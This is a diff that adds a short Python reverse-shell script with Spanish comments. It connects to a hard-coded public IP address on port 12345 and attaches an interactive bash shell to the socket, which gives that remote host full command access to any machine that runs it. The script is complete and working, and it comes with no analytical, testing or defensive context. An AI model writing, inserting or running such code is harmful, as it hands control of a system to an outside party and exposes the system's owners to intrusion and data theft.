@@ -1,0 +1,22 @@
+#!/usr/bin/python3
+
+import socket
+import subprocess
+
+# Definir la dirección IP y el puerto
+IP = "161.35.147.18"
+PUERTO = 12345
+
+# Crear el socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Conectar al servidor
+try:
+    s.connect((IP, PUERTO))
+    
+    # Redirigir la entrada y salida estándar al socket
+    subprocess.call(["/bin/bash", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
+    
+except Exception as e:
+    print(f"Error al conectar: {e}")
+
